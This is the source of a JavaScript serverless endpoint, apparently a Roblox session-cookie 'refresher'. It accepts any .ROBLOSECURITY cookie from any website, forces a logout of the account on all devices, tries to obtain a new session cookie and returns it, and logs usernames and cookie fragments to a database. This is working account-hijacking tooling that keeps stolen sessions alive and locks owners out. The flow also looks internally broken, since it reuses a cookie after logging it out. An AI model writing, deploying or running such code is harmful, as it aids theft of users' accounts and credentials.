import { logToDatabase } from './_lib/db.js';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    const { cookie } = req.body;
    
    if (!cookie) {
        return res.status(400).json({ 
            success: false, 
            message: 'Cookie is required' 
        });
    }
    
    try {
        // STEP 1: VERIFY OLD COOKIE
        const verifyRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
            method: 'GET',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        if (!verifyRes.ok) {
            await logToDatabase(null, null, 'refresh_failed', cookie.substring(0, 20));
            return res.status(200).json({
                success: false,
                message: '❌ Invalid or expired cookie. Cannot refresh.'
            });
        }
        
        const userData = await verifyRes.json();
        
        // STEP 2: GET CSRF TOKEN
        const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        const csrfToken = csrfRes.headers.get('x-csrf-token');
        
        // STEP 3: KILL OLD COOKIE (Logout from all devices)
        await fetch('https://auth.roblox.com/v1/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'X-CSRF-TOKEN': csrfToken || '',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            body: JSON.stringify({ universalLogout: true })
        });
        
        // STEP 4: GENERATE BRAND NEW COOKIE
        const newCookie = await getNewCookie(cookie, csrfToken);
        
        // STEP 5: VERIFY NEW COOKIE WORKS
        const newVerifyRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
            method: 'GET',
            headers: {
                'Cookie': `.ROBLOSECURITY=${newCookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        if (!newVerifyRes.ok) {
            throw new Error('Failed to generate valid new cookie');
        }
        
        const newUserData = await newVerifyRes.json();
        
        // STEP 6: LOG AND RETURN
        await logToDatabase(userData.id, userData.name, 'refresh_success_with_kill', newCookie.substring(0, 20));
        
        return res.status(200).json({
            success: true,
            oldCookieKilled: true,
            newCookie: newCookie,
            userId: userData.id,
            username: userData.name,
            message: `✅ OLD COOKIE KILLED! New cookie generated for @${userData.name}.`
        });
        
    } catch (error) {
        await logToDatabase(null, null, 'refresh_error', cookie?.substring(0, 20));
        return res.status(500).json({
            success: false,
            message: `Error: ${error.message}`
        });
    }
}

async function getNewCookie(oldCookie, csrfToken) {
    const endpoints = [
        'https://www.roblox.com/mobileapi/userinfo',
        'https://economy.roblox.com/v1/user/currency',
        'https://www.roblox.com/my/settings/json',
        'https://inventory.roblox.com/v1/users/0/inventory'
    ];
    
    for (const endpoint of endpoints) {
        try {
            const response = await fetch(endpoint, {
                method: 'GET',
                headers: {
                    'Cookie': `.ROBLOSECURITY=${oldCookie}`,
                    'X-CSRF-TOKEN': csrfToken || '',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            });
            
            const setCookie = response.headers.get('set-cookie');
            if (setCookie && setCookie.includes('.ROBLOSECURITY=')) {
                const match = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);
                if (match && match[1]) {
                    return match[1];
                }
            }
        } catch (err) {
            // Continue to next endpoint
        }
    }
    
    throw new Error('Could not generate new cookie. Please try again.');
}